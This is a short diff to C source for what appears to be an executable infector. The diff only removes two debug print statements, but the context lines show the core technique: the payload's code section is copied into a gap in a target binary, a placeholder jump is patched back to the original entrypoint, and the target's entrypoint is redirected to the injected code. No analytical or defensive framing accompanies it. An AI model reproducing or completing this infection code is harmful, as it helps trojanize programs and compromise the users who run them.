@@ -129,7 +129,6 @@ int patch_jumpAddr(void* start_offset,const uint64_t len,const uint64_t pattern,
   uint32_t data;
   for(int i=0;i<len;i++)  {
     data = *((uint32_t*)(start_offset+i));
-    printf("0x%x\n",data);
     if((data^pattern) == 0) {
       //printf("[+] pattern found at offset  0x%ln\n",(uint64_t*)(start_offset+i));
       *((uint32_t*)(start_offset+i))=(uint32_t)entrypoint-i-4;
@@ -159,7 +158,6 @@ int main(int argc,char *argv[]) {
   }
   memmove(map_targ+gapoff,map_payl+textoff,textsize);
   int ret = patch_jumpAddr(map_targ+gapoff,textsize,0xfffffffc,(entrypoint-gapoff));
-  printf("%d\n",ret);
   patch_entrypoint(map_targ,gapoff);
   close(payl_fd);
   close(targ_fd);
